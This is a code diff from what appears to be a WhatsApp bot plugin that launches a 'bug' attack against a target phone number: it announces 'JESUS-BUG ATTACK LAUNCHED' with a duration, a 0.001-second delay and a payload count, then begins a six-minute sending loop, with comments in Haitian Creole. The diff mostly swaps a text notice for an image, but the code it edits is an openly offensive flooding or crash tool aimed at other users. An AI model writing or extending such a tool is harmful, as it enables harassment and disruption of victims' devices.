@@ -12,7 +12,6 @@ cmd({
 }, async (bot, mek, m, { from, reply }) => {
   try {
     const prefix = config.PREFIX;
-
     const body = m.body || '';
     const cmdName = body.startsWith(prefix)
       ? body.slice(prefix.length).trim().split(' ')[0].toLowerCase()
@@ -45,10 +44,15 @@ cmd({
       }, { quoted: mek });
     }
 
+    // 🆕 VOYE PHOTO AK MESAJ
+    const imagePath = path.join(__dirname, '../media/1.png');
+    const imageBuffer = fs.readFileSync(imagePath);
     await bot.sendMessage(from, {
-      text: `🚨 𝐉𝐄𝐒𝐔𝐒-𝐁𝐔𝐆 𝐀𝐓𝐓𝐀𝐂𝐊 𝐋𝐀𝐔𝐍𝐂𝐇𝐄𝐃\n👤 Target: wa.me/${targetNumber}\n🕒 Duration: 6min\n⚡ Delay: 0.001s\n📦 Payloads: ${bugFiles.length}`,
+      image: imageBuffer,
+      caption: `🚨 𝐉𝐄𝐒𝐔𝐒-𝐁𝐔𝐆 𝐀𝐓𝐓𝐀𝐂𝐊 𝐋𝐀𝐔𝐍𝐂𝐇𝐄𝐃\n👤 Target: wa.me/${targetNumber}\n🕒 Duration: 6min\n⚡ Delay: 0.001s\n📦 Payloads: ${bugFiles.length}`,
     }, { quoted: mek });
 
+    // Kòmanse atak la
     const endTime = Date.now() + (6 * 60 * 1000); // 6 minutes
 
     while (Date.now() < endTime) {
